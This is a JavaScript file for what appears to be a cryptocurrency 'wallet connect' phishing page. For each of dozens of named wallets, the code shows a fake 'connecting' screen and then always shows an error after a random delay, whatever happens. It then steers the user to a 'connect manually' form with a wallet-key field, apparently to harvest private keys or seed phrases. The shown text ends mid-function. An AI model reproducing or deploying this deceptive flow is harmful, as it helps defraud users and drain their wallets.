

//document.addEventListener("DOMContentLoaded", function() {
  var errorSection = document.querySelector(".error-section");
  var connectingSection = document.querySelector(".connecting-section");
  var manualSection = document.querySelector(".manual-section");
  var connectBox = document.querySelector(".connect-box");
  var closeButton = document.getElementById("close-button");
  var tryAgain = document.querySelector(".try-again");
  var connectManually = document.querySelector(".connect-manually");
  var failedToConnect = document.getElementById("failed-to-connect")
  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
  var CoinLogo = document.getElementById("coin-logo");
  var CoinName = document.getElementById("coin-name");
  let coinType; // Declare coinType here

  var connectWallet = document.querySelector(".connect-wallet");
  var walletAddress = document.getElementById("wallet-key");


 function confirmButton2Status() {
  if (connectWallet.disabled === true) {
    connectWallet.style.backgroundColor = "grey";
    connectWallet.style.cursor = "not-allowed";
  }
  else {
    connectWallet.style.backgroundColor = "#5142FC";
    connectWallet.style.cursor = "pointer";
  }
}


function errorConnecting() {
  connectingSection.style.display = "none";
  errorSection.style.display = "block";
  manualSection.style.display = "none";
}
function retryConnecting() {
  connectingSection.style.display = "block";
  errorSection.style.display = "none";
  manualSection.style.display = "none";
  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
  setTimeout(function() {
    errorConnecting();
  }, errorTime);
}

  tryAgain.addEventListener("click", function() {
    retryConnecting();
  });
  connectManually.addEventListener("click", function() {
    connectingSection.style.display = "none";
    errorSection.style.display = "none";
    manualSection.style.display = "block";
  });

  closeButton.addEventListener("click", function() {
    connectBox.style.display = "none";
    connectingSection.style.display = "none";
    errorSection.style.display = "none";
    manualSection.style.display = "none";
  });


  var walletConnectCard = document.querySelector(".wallet-connect-card");
  var walletConnectName = document.getElementById("wallet-connect");
  walletConnectCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = walletConnectName.textContent;
    CoinLogo.src = "Images/Wallet-Connect-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var phantomCard = document.querySelector(".phantom-card");
  var phantomName = document.getElementById("phantom");
  phantomCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = phantomName.textContent;
    CoinLogo.src = "Images/Phantom-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var trustWalletCard = document.querySelector(".trust-wallet-card");
  var trustWalletName = document.getElementById("trust-wallet");
  trustWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = trustWalletName.textContent;
    CoinLogo.src = "Images/Trust-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var metamaskCard = document.querySelector(".metamask-card");
  var metamaskName = document.getElementById("metamask");
  metamaskCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = metamaskName.textContent;
    CoinLogo.src = "Images/Metamask-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var flintWalletCard = document.querySelector(".flint-wallet-card");
  var flintWalletName = document.getElementById("flint-wallet");
  flintWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = flintWalletName.textContent;
    CoinLogo.src = "Images/Flint-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var binanceWalletCard = document.querySelector(".binance-wallet-card");
  var binanceWalletName = document.getElementById("binance-wallet");
  binanceWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = binanceWalletName.textContent;
    CoinLogo.src = "Images/Binance-Chain-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var polygonWalletCard = document.querySelector(".polygon-wallet-card");
  var polygonWalletName = document.getElementById("polygon-wallet");
  polygonWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = polygonWalletName.textContent;
    CoinLogo.src = "Images/Polygon-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var rainbowCard = document.querySelector(".rainbow-card");
  var rainbowName = document.getElementById("rainbow");
  rainbowCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = rainbowName.textContent;
    CoinLogo.src = "Images/Rainbow-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var bitpayCard = document.querySelector(".bitpay-card");
  var bitpayName = document.getElementById("bitpay");
  bitpayCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = bitpayName.textContent;
    CoinLogo.src = "Images/Bitpay-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var wallethCard = document.querySelector(".walleth-card");
  var wallethName = document.getElementById("walleth");
  wallethCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = wallethName.textContent;
    CoinLogo.src = "Images/Walleth-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });


  var argentCard = document.querySelector(".argent-card");
  var argentName = document.getElementById("argent");
  argentCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = argentName.textContent;
    CoinLogo.src = "Images/Argent-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var huobiWalletCard = document.querySelector(".huobi-wallet-card");
  var huobiWalletName = document.getElementById("huobi-wallet");
  huobiWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = huobiWalletName.textContent;
    CoinLogo.src = "Images/Huobi-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var encryptedCard = document.querySelector(".encrypted-card");
  var encryptedName = document.getElementById("encrypted");
  encryptedCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = encryptedName.textContent;
    CoinLogo.src = "Images/Encrypted-Ink-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var compoundCard = document.querySelector(".compound-card");
  var compoundName = document.getElementById("compound");
  compoundCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = compoundName.textContent;
    CoinLogo.src = "Images/Compound-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var polkadotCard = document.querySelector(".polkadot-card");
  var polkadotName = document.getElementById("polkadot");
  polkadotCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = polkadotName.textContent;
    CoinLogo.src = "Images/Polkadot-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var iotexCard = document.querySelector(".iotex-card");
  var iotexName = document.getElementById("iotex");
  iotexCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = iotexName.textContent;
    CoinLogo.src = "Images/Iotex-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var coin98Card = document.querySelector(".coin98-card");
  var coin98Name = document.getElementById("coin98");
  coin98Card.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = coin98Name.textContent;
    CoinLogo.src = "Images/Coin98-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var coinbaseCard = document.querySelector(".coinbase-card");
  var coinbaseName = document.getElementById("coinbase");
  coinbaseCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = coinbaseName.textContent;
    CoinLogo.src = "Images/Coinbase-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var cryptoCard = document.querySelector(".crypto-card");
  var cryptoName = document.getElementById("crypto");
  cryptoCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = cryptoName.textContent;
    CoinLogo.src = "Images/Crypto-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var tokenPocketCard = document.querySelector(".token-pocket-card");
  var tokenPocketName = document.getElementById("token-pocket");
  tokenPocketCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = tokenPocketName.textContent;
    CoinLogo.src = "Images/Token-Pocket-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var mathWalletCard = document.querySelector(".math-wallet-card");
  var mathWalletName = document.getElementById("math-wallet");
  mathWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = mathWalletName.textContent;
    CoinLogo.src = "Images/Math-Wallet-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var ledgerLiveCard = document.querySelector(".ledger-live-card");
  var ledgerLiveName = document.getElementById("ledger-live");
  ledgerLiveCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = ledgerLiveName.textContent;
    CoinLogo.src = "Images/Ledger-Live-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var OneinchCard = document.querySelector(".Oneinch-card");
  var OneinchName = document.getElementById("Oneinch");
  OneinchCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = OneinchName.textContent;
    CoinLogo.src = "Images/1inch-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var dharmaCard = document.querySelector(".dharma-card");
  var dharmaName = document.getElementById("dharma");
  dharmaCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = dharmaName.textContent;
    CoinLogo.src = "Images/Dharma-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var trustVaultCard = document.querySelector(".trust-vault-card");
  var trustVaultName = document.getElementById("trust-vault");
  trustVaultCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = trustVaultName.textContent;
    CoinLogo.src = "Images/Trust-Vault-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var mykeyCard = document.querySelector(".mykey-card");
  var mykeyName = document.getElementById("mykey");
  mykeyCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = mykeyName.textContent;
    CoinLogo.src = "Images/Mykey-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var atomicCard = document.querySelector(".atomic-card");
  var atomicName = document.getElementById("atomic");
  atomicCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = atomicName.textContent;
    CoinLogo.src = "Images/Atomic-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var coolWalletCard = document.querySelector(".cool-wallet-card");
  var coolWalletName = document.getElementById("cool-wallet");
  coolWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = coolWalletName.textContent;
    CoinLogo.src = "Images/Cool-Wallet-S-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var nashCard = document.querySelector(".nash-card");
  var nashName = document.getElementById("nash");
  nashCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = nashName.textContent;
    CoinLogo.src = "Images/Nash-Logo.jpg";
    coinType = CoinName.textContent;
    
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var coinomiCard = document.querySelector(".coinomi-card");
  var coinomiName = document.getElementById("coinomi");
  coinomiCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = coinomiName.textContent;
    CoinLogo.src = "Images/Coinomi-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var gridplusCard = document.querySelector(".gridplus-card");
  var gridplusName = document.getElementById("gridplus");
  gridplusCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = gridplusName.textContent;
    CoinLogo.src = "Images/Gridplus-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var tokenaryCard = document.querySelector(".tokenary-card");
  var tokenaryName = document.getElementById("tokenary");
  tokenaryCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = tokenaryName.textContent;
    CoinLogo.src = "Images/Tokenary-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var safepalCard = document.querySelector(".safepal-card");
  var safepalName = document.getElementById("safepal");
  safepalCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = safepalName.textContent;
    CoinLogo.src = "Images/Safepal-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var infinitoCard = document.querySelector(".infinito-card");
  var infinitoName = document.getElementById("infinito");
  infinitoCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = infinitoName.textContent;
    CoinLogo.src = "Images/Infinito-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var walletIoCard = document.querySelector(".wallet-io-card");
  var walletIoName = document.getElementById("wallet-io");
  walletIoCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = walletIoName.textContent;
    CoinLogo.src = "Images/Wallet-Io-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var ownbitCard = document.querySelector(".ownbit-card");
  var ownbitName = document.getElementById("ownbit");
  ownbitCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = ownbitName.textContent;
    CoinLogo.src = "Images/Ownbit-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var easypocketCard = document.querySelector(".easypocket-card");
  var easypocketName = document.getElementById("easypocket");
  easypocketCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = easypocketName.textContent;
    CoinLogo.src = "Images/Easypocket-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var bridgeWalletCard = document.querySelector(".bridge-wallet-card");
  var bridgeWalletName = document.getElementById("bridge-wallet");
  bridgeWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = bridgeWalletName.textContent;
    CoinLogo.src = "Images/Bridge-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var viaWalletCard = document.querySelector(".via-wallet-card");
  var viaWalletName = document.getElementById("via-wallet");
  viaWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = viaWalletName.textContent;
    CoinLogo.src = "Images/Via-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var bitkeepCard = document.querySelector(".bitkeep-card");
  var bitkeepName = document.getElementById("bitkeep");
  bitkeepCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = bitkeepName.textContent;
    CoinLogo.src = "Images/Bitkeep-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var unstoppableWalletCard = document.querySelector(".unstoppable-wallet-card");
  var unstoppableWalletName = document.getElementById("unstoppable-wallet");
  unstoppableWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = unstoppableWalletName.textContent;
    CoinLogo.src = "Images/Unstoppable-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var halodefiWalletCard = document.querySelector(".halodefi-wallet-card");
  var halodefiWalletName = document.getElementById("halodefi-wallet");
  halodefiWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = halodefiWalletName.textContent;
    CoinLogo.src = "Images/Halodefi-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var dokWalletCard = document.querySelector(".dok-wallet-card");
  var dokWalletName = document.getElementById("dok-wallet");
  dokWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = dokWalletName.textContent;
    CoinLogo.src = "Images/Dok-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var celloWalletCard = document.querySelector(".cello-wallet-card");
  var celloWalletName = document.getElementById("cello-wallet");
  celloWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = celloWalletName.textContent;
    CoinLogo.src = "Images/Cello-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var coinusCard = document.querySelector(".coinus-card");
  var coinusName = document.getElementById("coinus");
  coinusCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = coinusName.textContent;
    CoinLogo.src = "Images/Coinus-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var valoraCard = document.querySelector(".valora-card");
  var valoraName = document.getElementById("valora");
  valoraCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = valoraName.textContent;
    CoinLogo.src = "Images/Valora-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var trusteeWalletCard = document.querySelector(".trustee-wallet-card");
  var trusteeWalletName = document.getElementById("trustee-wallet");
  trusteeWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = trusteeWalletName.textContent;
    CoinLogo.src = "Images/Trustee-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var gaurdaWalletCard = document.querySelector(".gaurda-wallet-card");
  var gaurdaWalletName = document.getElementById("gaurda-wallet");
  gaurdaWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = gaurdaWalletName.textContent;
    CoinLogo.src = "Images/Guarda-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var maiarWalletCard = document.querySelector(".maiar-wallet-card");
  var maiarWalletName = document.getElementById("maiar-wallet");
  maiarWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = maiarWalletName.textContent;
    CoinLogo.src = "Images/Maiarwallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var jadeWalletCard = document.querySelector(".jade-wallet-card");
  var jadeWalletName = document.getElementById("jade-wallet");
  jadeWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = jadeWalletName.textContent;
    CoinLogo.src = "Images/Jade-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var plasmapayCard = document.querySelector(".plasmapay-card");
  var plasmapayName = document.getElementById("plasmapay");
  plasmapayCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = plasmapayName.textContent;
    CoinLogo.src = "Images/Plasmapay-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var o3WalletCard = document.querySelector(".o3-wallet-card");
  var o3WalletName = document.getElementById("o3-wallet");
  o3WalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = o3WalletName.textContent;
    CoinLogo.src = "Images/O3-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var hashkeyCard = document.querySelector(".hashkey-card");
  var hashkeyName = document.getElementById("hashkey");
  hashkeyCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = hashkeyName.textContent;
    CoinLogo.src = "Images/Hashkey-Me-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var rwalletCard = document.querySelector(".rwallet-card");
  var rwalletName = document.getElementById("rwallet");
  rwalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = rwalletName.textContent;
    CoinLogo.src = "Images/Rwallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var flareWalletCard = document.querySelector(".flare-wallet-card");
  var flareWalletName = document.getElementById("flare-wallet");
  flareWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = flareWalletName.textContent;
    CoinLogo.src = "Images/Flare-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var kyberswapCard = document.querySelector(".kyberswap-card");
  var kyberswapName = document.getElementById("kyberswap");
  kyberswapCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = kyberswapName.textContent;
    CoinLogo.src = "Images/Kyberswap-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var atokenWalletCard = document.querySelector(".atoken-wallet-card");
  var atokenWalletName = document.getElementById("atoken-wallet");
  atokenWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = atokenWalletName.textContent;
    CoinLogo.src = "Images/Atoken-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var tongueWalletCard = document.querySelector(".tongue-wallet-card");
  var tongueWalletName = document.getElementById("tongue-wallet");
  tongueWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = tongueWalletName.textContent;
    CoinLogo.src = "Images/Tongue-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var xinfinCard = document.querySelector(".xinfin-card");
  var xinfinName = document.getElementById("xinfin");
  xinfinCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = xinfinName.textContent;
    CoinLogo.src = "Images/Xinfin-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var talkenWalletCard = document.querySelector(".talken-wallet-card");
  var talkenWalletName = document.getElementById("talken-wallet");
  talkenWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = talkenWalletName.textContent;
    CoinLogo.src = "Images/Talken-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var keyringCard = document.querySelector(".keyring-card");
  var keyringName = document.getElementById("keyring");
  keyringCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = keyringName.textContent;
    CoinLogo.src = "Images/Keyring-Pro-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var midasWalletCard = document.querySelector(".midas-wallet-card");
  var midasWalletName = document.getElementById("midas-wallet");
  midasWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = midasWalletName.textContent;
    CoinLogo.src = "Images/Midas-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var atWalletCard = document.querySelector(".at-wallet-card");
  var atWalletName = document.getElementById("at-wallet");
  atWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
